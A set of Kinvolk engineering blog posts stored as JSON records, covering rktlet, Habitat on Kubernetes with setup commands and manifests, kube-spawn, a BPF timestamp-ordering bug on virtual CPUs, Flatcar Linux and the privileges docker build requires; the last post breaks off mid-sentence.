{"website": "Kinvolk", "title": "Announcing the Initial Release of rktlet, the rkt CRI Implementation", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Iago López Galeiras\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/11/announcing-the-initial-release-of-rktlet-the-rkt-cri-implementation/", "abstract": "We are happy to announce the initial release of rktlet , the rkt implementation of the Kubernetes Container Runtime Interface . This is a preview release, and is not meant for production workloads. When using rktlet, all container workloads are run with the rkt container runtime. About rkt The rkt container runtime is unique amongst container runtimes in that, once rkt is finished setting up the pod and starting the application, no rkt code is left running. rkt also takes a security-first approach, not allowing insecure functionality unless the user explicitly disables security features. And rkt is pod-native, matching ideally with the Kubernetes concept of pods. In addition, rkt prefers to integrate and drive improvements into existing tools, rather than reinvent things. And lastly, rkt allows for running apps in various isolation environments — container, VM or host/none. rkt support in Kubernetes With this initial release of rktlet, rkt currently has two Kubernetes implementations. Original rkt support for Kubernetes was introduced in Kubernetes version 1.3. That implementation — which goes by the name rktnetes — resides in the core of Kubernetes. Just as rkt itself kickstarted the drive towards standards in containers, this original rkt integration also spurred the introduction of a standard interface within Kubernetes to enable adding support for other container runtimes. This interface is known as the Kubernetes Container Runtime Interface (CRI). With the Kubernetes CRI, container runtimes have a clear path towards integrating with Kubernetes. rktlet is the rkt implementation of that interface. Project goals The goal is to make rktlet the preferred means to run workloads with rkt in Kubernetes. But companies like Blablacar rely on the Kubernetes-internal implementation of rkt to run their infrastructure. Thus, we cannot just remove that implementation without having a viable alternative. rktlet currently passes 129 of the 145 Kubernetes end-to-end conformance tests . We aim to have full compliance. Later in this article, we’ll look at what needs remain to get there. Once rktlet it ready, the plan is to deprecate the rkt implementation in the core of Kubernetes. How rktlet works rktlet is a daemon that communicates with the kubelet via gRPC . The CRI is the interface by which kubelet and rktlet communicate. The main CRI methods are RunPodSandbox(), PodSandboxStatus(), CreateContainer(), StartContainer(), StopPodSandbox(), ListContainers(), etc. These methods handle lifecycle management and gather state. To create pods, rktlet creates a transient systemd service using systemd-run with the appropriate rkt command line invocation. Subsequent actions like adding and removing containers to and from the pods, respectively, are done by calling the rkt command line tool. The following component diagram provides a visualization of what we’ve described. To try out rktlet, follow the Getting Started guide . Driving rkt development Work on rktlet has spurred a couple new features inside of rkt itself which we’ll take a moment to highlight. Pod manipulation rkt has always been pod-native, but the pods themselves were immutable. The original design did not allow for actions such as starting, stopping, or adding apps to a pod. These features were added to rkt in order to be CRI conformant. This work is described in the app level API document Logging and attaching Historically, apps in rkt have offloaded logging to a sidecar service — by default systemd-journald — that multiplexes their output to the outside world. The sidecar service handled logging and interactive applications reused a parent TTY. But the CRI defines a logging format that is plaintext whereas systemd-journald’s output format is binary. Moreover, Kubernetes has an attaching feature that couldn’t be implemented with the old design. To solve these problems, a component called iottymux was implemented. When enabled, it replaces systemd-journald completely; providing app logs that are formatted to be CRI compatible and the needed logic for the attach feature. For a more detailed description of this design, check out the log attach design document . Future work for rktlet rktlet still needs work before it’s ready for production workloads and be 100% CRI compliant. Some of the work that still needs to be done is… kubectl attach , CRI container stats , Performance improvements , More testing with kubernetes v1.8.x Documentation improvements Join the team If you’d like to join the effort, rktlet offers ample chances to get involved. Ongoing work is discussed in the #sig-node-rkt Kubernetes Slack channel . If you’re at Kubecon North America in Austin, please come by the rkt salon to talk about rkt and rktlet. Thanks Thanks to all those that have contributed to rktlet and to CoreOS , Blablacar , CNCF and our team at Kinvolk for supporting its development.", "date": "2017-11-29"},
{"website": "Kinvolk", "title": "Kubernetes The Hab Way", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Michael Schubert\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/12/kubernetes-the-hab-way/", "abstract": "How does a Kubernetes setup the Hab(itat) way look? In this blog post we will explore how to use Habitat’s application automation to set up and run a Kubernetes cluster from scratch, based on the well-known “ Kubernetes The Hard Way ” manual by Kelsey Hightower . A detailed README with step-by-step instructions and a Vagrant environment can be found in the Kubernetes The Hab Way repository. Kubernetes Core Components To recap, let’s have a brief look on the building blocks of a Kubernetes cluster and their purpose: etcd , the distributed key value store used by Kubernetes for persistent storage, the API server, the API frontend to the cluster’s shared state, the controller manager, responsible for ensuring the cluster reflects the configured state, the scheduler, responsible for distributing workloads on the cluster, the network proxy, for service network configuration on cluster nodes and the kubelet, the “primary node agent”. For each of the components above, you can now find core packages on bldr.habitat.sh . Alternatively, you can fork the upstream core plans or build your own packages from scratch. Habitat studio makes this process easy. By packing Kubernetes components with Habitat, we can use Habitat’s application delivery pipeline and service automation, and benefit from it as any other Habitat-managed application. Deploying services Deployment of all services follows the same pattern: first loading the service and then applying custom configuration. Let’s have a look at the setup of etcd to understand how this works in detail: To load the service with default configuration, we use the hab sup subcommand: $ sudo hab sup load core/etcd --topology leader Then we apply custom configuration. For Kubernetes we want to use client and peer certificate authentication instead of autogenerated SSL certificates. We have to upload the certificate files and change the corresponding etcd configuration parameters: $ for f in /vagrant/certificates/ { etcd.pem,etcd-key.pem,ca.pem } ; do sudo hab file upload etcd.default 1 \" ${ f } \" ; done $ cat /vagrant/config/svc-etcd.toml\netcd-auto-tls = \"false\" etcd-http-proto = \"https\" etcd-client-cert-auth = \"true\" etcd-cert-file = \"files/etcd.pem\" etcd-key-file = \"files/etcd-key.pem\" etcd-trusted-ca-file = \"files/ca.pem\" etcd-peer-client-cert-auth = \"true\" etcd-peer-cert-file = \"files/etcd.pem\" etcd-peer-key-file = \"files/etcd-key.pem\" etcd-peer-trusted-ca-file = \"files/ca.pem\" $ sudo hab config apply etcd.default 1 /vagrant/config/svc-etcd.toml Since service configuration with Habitat is per service group, we don’t have to do this for each member instance of etcd. The Habitat supervisor will distribute the configuration and files to all instances and reload the service automatically. If you follow the step-by-step setup on GitHub, you will notice the same pattern applies to all components Per-instance configuration Sometimes, each instance of a service requires custom configuration parameters or files, though. With Habitat all configuration is shared within the service group and it’s not possible to provide configuration to a single instance only. For this case we have to fall back to “traditional infrastructure provisioning”. Also, all files are limited to 4096 bytes which is sometimes not enough. In the Kubernetes setup, each kubelet needs a custom kubeconfig, CNI configuration , and a personal node certificate. For this we create a directory ( /var/lib/kubelet-config/ ) and place the files there before loading the service. The Habitat service configuration then points to files in that directory: $ cat config/svc-kubelet.toml kubeconfig = \"/var/lib/kubelet-config/kubeconfig\" client-ca-file = \"/var/lib/kubelet-config/ca.pem\" tls-cert-file = \"/var/lib/kubelet-config/node.pem\" tls-private-key-file = \"/var/lib/kubelet-config/node-key.pem\" cni-conf-dir = \"/var/lib/kubelet-config/cni/\" Automatic service updates If desired, Habitat services can be automatically updated by the supervisor once a new version is published on a channel by loading a service with --strategy set to either at-once or rolling . By default, automatic updates are disabled. With this, Kubernetes components can be self-updating. An interesting topic that could be explored in the future. Conclusion We have demonstrated how Habitat can be used to build, setup, and run Kubernetes cluster components in the same way as any other application. If you are interested in using Habitat to manage your Kubernetes cluster, keep an eye on this blog and the “Kubernetes The Hab Way” repo for future updates and improvements. Also, have a look at the Habitat operator , a Kubernetes operator for Habitat services, that allows you to run Habitat services on Kubernetes.", "date": "2017-12-04"},
{"website": "Kinvolk", "title": "Introducing the Habitat Kubernetes Exporter", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      zeeshan-ali\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/12/introducing-the-habitat-kubernetes-exporter/", "abstract": "At Kinvolk , we’ve been working with the Habitat team at Chef to make Habitat-packaged applications run well in Kubernetes. The first step on this journey was the Habitat operator for Kubernetes which my colleague, Lili, already wrote about . The second part of this project —the focus of this post— is to make it easier to deploy Habitat apps to a Kubernetes cluster that is running the Habitat operator. Exporting to Kubernetes To that end, we’d like to introduce the Habitat Kubernetes exporter. The Kubernetes exporter is an additional command line subcommand to the standard Habitat CLI interface. It leverages the existing Docker image export functionality and, additionally, generates a Kubernetes manifest that can be deployed to a Kubernetes cluster running the Habitat operator. The command line for the Kubernetes exporter is: $ hab pkg export kubernetes ORIGIN/NAME Run hab pkg export kubernetes --help to see the full list of available options and general help. Demo Let’s take a look at the Habitat Kubernetes exporter in action. As you can see, the Habitat Kubernetes exporter helps you to deploy your applications that are built and packaged with Habitat on a Kubernetes cluster by generating the needed manifest files. More to come We’ve got more exciting ideas for making Habitat and Habitat Builder work even more seamlessly with Kubernetes. So stay tuned for more.", "date": "2017-12-05"},
{"website": "Kinvolk", "title": "What's new in kube-spawn", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Iago López Galeiras\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/12/whats-new-in-kube-spawn/", "abstract": "There’s been a number of changes in kube-spawn kube-spawn since we announced it . The main focus of the recent developments was improving the CLI, supporting several clusters running in parallel, and enabling developers to test Kubernetes patches easily. In addition, we’ve added a bunch of documentation , improved error messages and, of course, fixed a lot of bugs. CLI redesign We’ve completely redesigned the CLI commands used to interact with kube-spawn. You can now use create to generate the cluster environment, and then start to boot and provision the cluster. The convenience up command does the two steps in one so you can quickly get a cluster with only one command. Once a cluster is up and running you can use stop to stop it and keep it there to start it again later, or restart to stop and start the cluster. The command destroy will take a cluster in the stopped or running state and remove it completely, including any disk space the cluster was using. The following diagram provides a visualization of the CLI workflow. Multi-cluster support Previously, users could only run one cluster at the time. With the flag --cluster-name flag, running multiple clusters in parallel is now possible. All the CLI operations can take --cluster-name to specify which cluster you’re referring to. To see your currently created clusters, a new command list was added to kube-spawn. This is especially useful when you want to test how your app behaves in different Kubernetes versions or, as a Kubernetes developer, when you made a change to Kubernetes itself and want to compare a cluster without changes and another with your change side-by-side. Which leads us to the next feature. Dev workflow support kube-spawn makes testing changes to Kubernetes really easy. You just need to build your Hyperkube Docker image with a particular VERSION tag. Once that’s built, you need to start kube-spawn with the --dev flag, and set --hyperkube-tag to the same name you used when building the Hyperkube image. Taking advantage of the aforementioned multi-cluster support, you can build current Kubernetes master, start a cluster with --cluster-name=master , build Kubernetes your patch, and start another cluster with --cluster-name=fix . You’ll now have two clusters to check how your patch behaves in comparison with an unpatched Kubernetes. You can find a detailed step-by-step example of this in kube-spawn’s documentation . kube-spawn, a certified Kubernetes distribution We’ve successfully run the Kubernetes Software Conformance Certification tests based on Sonobuoy for Kubernetes v1.7 and v1.8. We’ve submitted the results to CNCF and they merged our PRs. This means kube-spawn is now a certified Kubernetes distribution . Conclusion With the above additions, we feel like kube-spawn is one of the best tools for developing on Linux with, and on, Kubernetes. If you want to try it out, we’ve just released kube-spawn v0.2.1 . We look forward to your feedback and welcome issues or PRs on the Github project .", "date": "2017-12-05"},
{"website": "Kinvolk", "title": "Automated Build to Kubernetes with Habitat Builder", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      indra-gupta\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/12/automated-build-to-kubernetes-with-habitat-builder/", "abstract": "Introduction Imagine a set of tools which allows you to not only build your codebase automatically each time you apply new changes but also to deploy to a cluster for testing, provided the build is successful. Once the smoke tests pass or the QA team gives the go ahead, the same artifact can be automatically deployed to production. In this blog post we talk about such an experimental pipeline that we’ve built using Habitat Builder and Kubernetes . But first, let’s look at the building blocks. What is Habitat and Habitat Builder? Habitat is a tool by Chef that allows one to automate the deployment of applications. It allows developers to package their application for multiple environments like a container runtime or a VM. One of Habitat’s components is Builder. It uses a plan.sh file, which is part of the application codebase, to build a Habitat package out of it. A plan.sh file for Habitat is similar to what a Dockerfile is to Docker , and like Docker, it outputs a Habitat artifact that has a .hart extension. Habitat also has a concept called channels which are similar to tags. By default, a successful build is tagged under the unstable channel and users can use the concept of promotion to promote a specific build of a package to a different channel like stable , staging or production . Users can choose channel names for themselves and use the hab pkg promote command to promote a package to a specific channel. Please check out the tutorials on the Habitat site for a more in-depth introduction to Habitat. Habitat ❤ Kubernetes Kubernetes is a platform that runs containerized applications and supports container scheduling, orchestration, and service discovery. Thus, while Kubernetes does the infrastructure management, Habitat manages the application packaging and deployment. We will take a look at the available tools that help us integrate Habitat in a functioning Kubernetes cluster. Habitat Operator A Kubernetes Operator is an abstraction that takes care of running a more complex piece of software. It leverages the Kubernetes API, and manages and configures the application by hiding the complexities away from the end user. This allows a user to be able to focus on using the application for their purposes instead of dealing with deployment and configuration themselves. The Kinvolk team built a Habitat Operator with exactly these goals in mind. Habitat Kubernetes Exporter Recently, a new exporter was added to Habitat by the Kinvolk team that helps in integrating Habitat with Kubernetes. It creates and uploads a Docker image to a Docker registry, and returns a manifest that can be applied with kubectl . The output manifest file can be specified as a command line argument and it also accepts a custom Docker registry URL. This blog post covers this topic in more depth along with a demo at the end. Automating Kubernetes Export Today we are excited to show you a demo of a fully automated Habitat Builder to Kubernetes pipeline that we are currently working on together with the Habitat folks: The video shows a private Habitat Builder instance re-building the it-works project, exporting a Docker image to Docker Hub and automatically deploying it to a local Kubernetes cluster through the Habitat Operator. Last but not least, the service is promoted from unstable to testing automatically. In the future, Kubernetes integration will allow you to set up not only seamless, automated deploys but also bring Habitat’s service promotion to services running in Kubernetes. Stay tuned! If you want to follow our work (or set up the prototype yourself), you can find a detailed README here . Conclusion This is an exciting start to how both Habitat and Kubernetes can complement each other. If you are at KubeCon , stop by at the Habitat or Kinvolk booth to chat about Habitat and Kubernetes. You can also find us on the Habitat slack in the #general or #kubernetes channels.", "date": "2017-12-07"},
{"website": "Kinvolk", "title": "Get started with Habitat on Kubernetes", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Lorenzo Manacorda\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/12/get-started-with-habitat-on-kubernetes/", "abstract": "Habitat is a project that aims to solve the problem of building, deploying and managing services. We at Kinvolk have been working on Kubernetes integration for Habitat in cooperation with Chef. This integration comes in the form of a Kubernetes controller called Habitat operator. The Habitat operator allows cluster administrators to fully utilize Habitat features inside their Kubernetes clusters, all the while maintaining high compatibility with the “Kubernetes way” of doing things. For more details about Habitat and the Habitat operator have a look at our introductory blog post . In this guide we will explain how to use the Habitat operator to run and manage a Habitat-packaged application in a Kubernetes cluster on Google Kubernetes Engine (GKE). This guide assumes a basic understanding of Kubernetes. We will deploy a simple web application which displays the number of times the page has been accessed. Prerequisites We’re going to assume some initial setup is done. For example, you’ll need to have created an account on Google Cloud Platform and have already installed and configured the Google Cloud SDK as well as its beta component . Lastly, you’ll want to download kubectl so you can connect to the cluster. Creating a cluster To start, we’ll want to create a project on GCP to contain the cluster and all related settings. Project names are unique on GCP, so use one of your choosing in the following commands. Create it with: $ gcloud projects create habitat-on-kubernetes We will then need to enable the “compute API” for the project we’ve just created. This API allows us to create clusters and containers. $ gcloud service-management enable container.googleapis.com --project habitat-on-kubernetes We also need to enable billing for our project, since we’re going to spin up some nodes in a cluster: $ gcloud beta billing projects link hab-foobar --billing-account = $your -billing-id Now we’re ready to create the cluster. We will have to choose a name and a zone in which the cluster will reside. You can list existing zones with: $ gcloud compute zones list --project habitat-on-kubernetes This following command sets the zone to “europe-west1-b” and the name to “habitat-cluster”. This command can take several minutes to complete. $ gcloud container clusters create habitat-demo-cluster --project habitat-on-kubernetes --zone europe-west1-b Deploying the operator The next step is to deploy the Habitat operator. This is a component that runs in your cluster, and reacts to the creation and deletion of Habitat Custom Objects by creating, updating or deleting resources in the cluster. Like all objects, operators are deployed with a yaml manifest file. The contents of the manifest file are shown below:. apiVersion : extensions/v1beta1 kind : Deployment metadata : name : habitat-operator spec : replicas : 1 template : metadata : labels : name : habitat-operator spec : containers : - name : habitat-operator image : kinvolk/habitat-operator:v0.2.0 From the root of our demo application, we can then deploy the operator with: kubectl create -f kubernetes/habitat-operator.yml Deploying the demo application With that done, we can finally deploy our demo application: apiVersion : habitat.sh/v1 kind : Habitat metadata : name : habitat-demo-counter spec : image : kinvolk/habitat-demo-counter count : 1 service : topology : standalone --- apiVersion : v1 kind : Service metadata : name : front spec : selector : habitat-name : habitat-demo-counter type : LoadBalancer ports : - name : web targetPort : 8000 port : 8000 protocol : TCP Just run the following command: $ kubectl create -f kubernetes/habitat-demo-counter.yml We can monitor the status of our deployment with kubectl get pod -w . Once all pods are in the “Running” state, our application is fully deployed and ready to interact with. Let’s find out the public IP address of our application by running kubectl get services front .\nThe IP will be listed under the column “External IP”. Let’s test it out by going to the service’s IP and port 8000, where we should see the app’s landing page, with the view counter. The counter increases every time we refresh the page, and can be reset with the “Reset” button. To see this in action, watch the video below. The Ruby web application has been packaged with Habitat , and is now running as a Habitat service in a Docker container deployed on Kubernetes. Congratulations!", "date": "2017-12-06"},
{"website": "Kinvolk", "title": "Timing issues when using BPF with virtual CPUs", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2018/02/timing-issues-when-using-bpf-with-virtual-cpus/", "abstract": "Introduction After implementing the collecting of TCP connections using eBPF in Weave Scope (see our post on the Weaveworks blog) we faced an interesting bug that happened only in virtualized environments like AWS, but not on bare metal. The events retrieved via eBPF seemed to be received in the wrong chronological order. We are going to use this bug as an opportunity to discuss some interesting aspects of BPF and virtual CPUs (vCPUs). Background Let’s describe in more detail the scenario and provide some background on Linux clocks. Why is chronological order important for Scope? Scope provides a visualization of network connections in distributed systems. To do this, Scope needs to maintain a list of current TCP connections. It does so by receiving TCP events from the kernel via the eBPF program we wrote, tcptracer-bpf . Scope can receive either TCP connect , accept , or close events and update its internal state accordingly. If events were to be received in the wrong order–a TCP close before a TCP connect –Scope would not be able to make sense of the events; the first TCP close would not match any existing connection that Scope knows of, and the second TCP connect would add a connection in the Scope internal state that will never be removed. TCP events sent from kernel space to userspace How events are transferred from kernel to the Scope process? Context switches and kernel/userspace transitions can be slow and we need an efficient way to transfer a large number of events. This is achieved using a perf ring buffer. A ring buffer or a circular buffer is a data structure that allows a writer to send events to a reader asynchronously. The perf subsystem in the Linux kernel has a ring buffer implementation that allows a writer in the kernel to send events to a reader in userspace. It is done without any expensive locking mechanism by using well-placed memory barriers . On the kernel side, the BPF program writes an event in the ring buffer with the BPF helper function bpf_perf_event_output() , introduced in Linux 4.4. On the userspace side, we can read the events either from an mmaped memory region (fast), or from a bpf map file descriptor with the read() system call (slower). Scope uses the fast method. However, as soon as the computer has more than one CPU, several TCP events could happen simultaneously; one per CPU for example. This means there could be several writers at the same time and we will not be able to use a single ring buffer for everything. The solution is simple; use a different ring buffer for each CPU. On the kernel side, each CPU will write into its own ring buffer and the userspace process can read sequentially from all ring buffers. TCP events traveling through ring buffers. Multiple ring buffers introduces out-of-order events Each ring buffer is normally ordered chronologically as expected because each CPU writes the events sequentially into the ring buffer. But on a busy system, there could be several events pending in each ring buffer. When the user-space process picks the events, at first it does not know whether the event from ring buffer cpu#0 happened before or after the event from ring buffer cpu#1 . Adding timestamps for sorting events Fortunately, BPF has a simple way to address this: a bpf helper function called bpf_ktime_get_ns() introduced in Linux 4.1 gives us a timestamp in nanoseconds. The TCP event written on the ring buffer is a struct. We simply added a field in the struct with a timestamp. When the userspace program receives events from different ring buffers, we sort the events according to the timestamp. The BPF program (in yellow) executed by a CPU calls two BPF helper functions: bpf_ktime_get_ns() and bpf_perf_event_output() Sorting and synchronization Sorting is actually not that simple because we don’t just have a set of events to sort. Instead, we have a dynamic system where several sources of events are continuously giving the process new events. As a result when sorting the events received at some point in time, there could be a scenario where we receive a new event that has to be placed before the events we are currently sorting. This is like sorting a set without knowing the complete set of items to sort. To solve this problem, Scope needs a means of synchronization. Before we start gathering events and sorting, we measure the time with clock_gettime() . Then, we read events from all the ring buffers but stop processing a ring buffer if it is empty or if it gives us an event with a timestamp after the time of clock_gettime(). It is done in this way so as to only sort the events that are emitted before the beginning of the collection. New events will only be sorted in the next iteration. A word on different clocks Linux has several clocks as you can see in the clock_gettime() man page . We need to use a monotonic clock, otherwise the timestamp from different events cannot be compared meaningfully. Non-monotonicity can come from clock updates from NTP, updates from other software (Google clock skew daemon), timezones, leap seconds, and other phenomena. But also importantly, we need to use the same clock in the events (measured with the BPF helper function bpf_ktime_get_ns ) and the userspace process (with system call clock_gettime ), since we compare the two clocks. Fortunately, the BPF helper function gives us the equivalent of CLOCK_MONOTONIC . Bugs in the Linux kernel can make the timestamp wrong. For example, a bug was introduced in 4.8 but was backported to older kernels by distros. The fix was included in 4.9 and also backported. For example, in Ubuntu, the bug was introduced in kernel 4.4.0-42 and it’s not fixed until kernel 4.4.0-51. The problem with vCPUs The above scenario requires strictly reliable timing. But vCPUs don’t make this straight-forward. Events are still unordered sometimes Despite implementing all of this, we still sometimes noticed that events were ordered incorrectly. It happened rarely, like once every few days, and only on EC2 instances–not on bare-metal. What explains the difference of behaviour between virtualized environments and bare-metal? To understand the difference, we’ll need to take a closer look at the source code. Scope uses the library tcptracer-bpf to load the BPF programs. The BPF programs are actually quite complex because they need to handle different cases: IPv4 vs IPv6, the asynchronous nature of TCP connect and the difficulty of passing contextes between BPF functions.  But, for the purpose of this race, we can simplify it to two function calls: bpf_ktime_get_ns() to measure the time bpf_perf_event_output() to write the event–including the timestamp–to the ring buffer The way it was written, we assumed that the time between those two functions was negligible or at least constant. But in virtualized environments, virtual CPUs (vCPU) can randomly sleep , even inside BPF execution in kernel, depending on the hypervisor scheduling. So the time a BPF program takes to complete can vary from one execution to another. Consider the following diagram: Two CPUs executing the same BPF function concurrently With a vCPU, we have no guarantees with respect to how long a BPF program will take between the two function calls–we’ve seen up to 98ms. It means that the userspace program does not have a guarantee that it will receive all the events before a specific timestamp. In effect, this means we can not rely on absolute timing consistency on virtualization environments. This, unfortunately, means implementers must take such a scenario into consideration. Possible fixes Any solution would have to ensure that the user-space Scope process waits enough time to have received the events from the different queues up to a specific time. One suggested solution was to regularly generate synchronization events on each CPU and deliver them on the same path in the ring buffers. This would ensure that one CPU is not sleeping for a long time without handling events. But due to the difficulty of implementation and the rarity of the issue, we implemented a workaround by just detecting when the problem happens and restarting the BPF engine in tcptracer-bpf. Conclusion Investigating this bug and writing workaround patches for it made us write a reproducer using CPU affinity primitives (taskset) and explore several complex aspects of Linux systems: virtual CPUs in hypervisors, clocks, ring buffers, and of course eBPF. We’d be interested to hear from others who have encountered such issues with vCPUs and especially those who have additional insight or other ideas for proper fixes. Kinvolk is available for hire for Linux and Kubernetes based projects Follow us on Twitter to get updates on what Kinvolk is up to.", "date": "2018-02-20"},
{"website": "Kinvolk", "title": "Join the Kinvolk team at FOSDEM 2018!", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Lexi Nadolski\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2018/01/join-the-kinvolk-team-at-fosdem-2018/", "abstract": "FOSDEM, the premier European open source event that takes place in Brussels, is right around the corner! Most of the Kinvolk team is heading there for a collaborative weekend, with three of our engineers giving talks. Kinvolk Talk Schedule Sunday, February 4, 2018 10:00 - 10:25: Zeeshan Ali, “ Rust memory management \" Zeeshan, software engineer at Kinvolk, will give a quick introduction to memory management concepts of Rust, a system of programming language that focuses on safety and performance simultaneously. 11:30 - 11:50: Iago López Galeiras, “ State of the rkt container runtime and its Kubernetes integration \" Iago, technical lead & co-founder at Kinvolk, will be diving into rkt container runtime and its Kubernetes integration, specifically looking at the progress of rkt and rktlet and the Kubernetes CRI implementation of rkt. 15:05 - 15:25: Alban Crequy, “ Exploring container image distribution with casync \" Alban, CTO and co-founder at Kinvolk, will explore container image distribution with casync, a content-addressable data synchronization tool. We’re looking forward to seeing old friends and making new ones. Follow us on Twitter to see what we are up to at the conference!", "date": "2018-01-12"},
{"website": "Kinvolk", "title": "Kinvolk is now a Kubernetes Certified Service Provider", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2018/02/kinvolk-is-now-a-kubernetes-certified-service-provider/", "abstract": "The Kinvolk team is proud to announce that we are now a Kubernetes Certified Service Provider . We join an esteemed group of organizations that provide valuable services to the Kubernetes community. Kubernetes Certified Service Providers are vetted service companies that have at least 3 Certified Kubernetes Administrators on staff, have a track record of providing development and operation services to companies, and have that work used in production. At Kinvolk, we have collaborated with leading companies in the cloud-native community to help build cloud infrastructure technologies that integrate optimally with Linux. Companies come to Kinvolk because of our unique mix of core Linux knowledge combined with well-documented experience in applying that knowledge to modern cloud infrastructure projects. We look forward to continuing such collaborations with more partners in the Kubernetes community. To learn more about how our team can help you build or improve your products, or the open source projects you rely on, contact us at [email protected] . Follow us on Twitter to get updates on what Kinvolk is up to.", "date": "2018-02-21"},
{"website": "Kinvolk", "title": "Announcing the Flatcar Linux project", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2018/03/announcing-the-flatcar-linux-project/", "abstract": "Today Kinvolk announces Flatcar Linux , an immutable Linux distribution for containers. With this announcement, Kinvolk is opening the Flatcar Linux project to early testers.\nIf you are interested in becoming a tester and willing to provide feedback, please let us know . Flatcar Linux is a friendly fork of CoreOS' Container Linux and as such, compatible with it.\nIt is independently built, distributed and supported by the Kinvolk team. Why fork Container Linux? At Kinvolk, we provide support and engineering services for foundational open-source Linux projects used in cloud infrastructure.\nLast year we started getting inquiries about providing support for Container Linux.\nSince those inquiries, we had been thinking about how we could offer such support. When we are typically asked to provide support for projects that we do not maintain–a common occurrence–, the process is rather simple.\nWe work with the upstream maintainers to evaluate whether a change would be acceptable and attempt to get that work into the upstream project.\nIf that change is not acceptable to the upstream project and a client needs it, we can create a patch set that we maintain and provide our own release builds.\nThus, it is straightforward to provide commercial support for upstream projects. Providing commercial support for a Linux distribution is more difficult and can not be done without having full control over the means of building, signing and delivering the operating system images and updates.\nThus, our conclusion was that forking the project would be required. Why now? With the announcement of Red Hat’s acquisition of CoreOS, many in the cloud native community quickly asked, “What is going to happen to Container Linux?”\nWe were pleased when Rob announced Red Hat’s commitment to maintaining Container Linux as a community project.\nBut these events bring up two issues that Flatcar Linux aims to address. The strongest open source projects have multiple commercial vendors that collaborate together in a mutually beneficial relationship.\nThis increases the bus factor for a project.\nContainer Linux has a bus factor of 1. The introduction of Flatcar Linux brings that to 2. While we are hopeful that Red Hat is committed to maintaining Container Linux as an open source project, we feel that it is important that open source projects, especially those that are at the core of your system, have strong commercial support. Road to general availability Over the next month or so, we will be going through a testing phase. We will focus on responding to feedback that we receive from testers. We will also concentrate on improving processes and our build and delivery pipeline. Once the team is satisfied that the release images are working well and we are able to reliably deliver images and updates, we will make the project generally available. To receive notification when this happen, sign up for project updates . How can I help? We are looking for help testing builds and providing feedback. Let us know if you’d be able to test images here . We are also looking for vendors that could donate caching, hosting and other infrastructure services to the project. You can contact us about this at [email protected] . More information For more information, please see the project FAQ . Follow Flatcar Linux and Kinvolk on Twitter to get updates about the Flatcar Linux project.", "date": "2018-03-06"},
{"website": "Kinvolk", "title": "Towards unprivileged container builds", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2018/04/towards-unprivileged-container-builds/", "abstract": "Once upon a time, software was built and installed with the classic triptych ./configure , make , make install . The build part with make didn’t need to be run as root, which was, in fact, discouraged. Later, software started being distributed through package managers and built with rpm or dpkg-buildpackage . Building packages as root was still unnecessary and discouraged. Since rpm or deb packages are just archive files, there shouldn’t be any need for privileged operations to build them. After all, we don’t need the ability to load a kernel module or reconfigure the network to create an archive file. Why should we avoid building software as root? First, to avoid potential collateral damage to the developer’s machine. Second, to avoid being compromised by potentially untrusted resources. This is especially important for build services where anyone can submit a build job: the administrators of the build service have to protect their services against potentially malicious build submissions. Nowadays, more and more software in cloud infrastructure is built and distributed as container images. Whether it is a Docker image, an OCI bundle , ACI or another format, this is not so different from an archive file. And yet, the majority of container images are built via a Dockerfile with the Docker Engine, which, along with most of its operations, mostly runs as root. This makes life difficult for build services that want to offer container builds to users that are not necessarily trusted. How did we dig ourselves into this hole? Why does docker build need root? There are two reasons why docker build needs root: the build command requires root for some images and to setup the build container. Run commands with privileges Dockerfiles allow executing arbitrary commands inside the container environment that it is building with the “RUN” command. This makes the build very convenient: users can use “apt” on Ubuntu based images to install additional packages and they will not be installed on the host but in the container that is being built. This alone requires root access in the container because “apt” will need to install files in directories that are only writable by root. Starting the build container To be able to execute those “RUN” commands in the container, “docker build” needs to start this build container first. To start any container, Docker needs to perform the following privileged operations, among others: Preparing an overlay filesystem. This is necessary to keep track of the changes compared to the base image and requires CAP_SYS_ADMIN to mount. Creating new Linux namespaces (sometimes called “unsharing”): mount namespace, pid namespace, etc. All of them (except one, we will see below) require the CAP_SYS_ADMIN capability. pivot_root or chroot , which also require CAP_SYS_ADMIN or CAP_SYS_CHROOT . Mounting basic filesystems like /proc . The “RUN” command can execute arbitrary shell scripts, which often require a properly set up /proc . Preparing basic device nodes like /dev/null , /dev/zero . This is also necessary for a lot of shell scripts. Depending on how they are prepared, this requires either CAP_MKNOD or CAP_SYS_ADMIN . Only root can perform these operations: Operation Capability required Without root? Mount a new overlayfs CAP_SYS_ADMIN ❌ Create new (non-user) namespace CAP_SYS_ADMIN ❌ Chroot or pivot_root CAP_CHROOT or CAP_SYS_ADMIN ❌ Mount a new procfs CAP_SYS_ADMIN ❌ Prepare basic device nodes CAP_MKNOD or CAP_SYS_ADMIN ❌ This blog post will focus on some of those operations in detail. This is not an exhaustive list. For example, preparing basic device nodes is not covered in this blog post. Projects similar to docker-build There are other projects to build docker containers that aim to be unprivileged. Some want to support builds from a Dockerfile. img : Standalone, daemon-less, unprivileged Dockerfile and 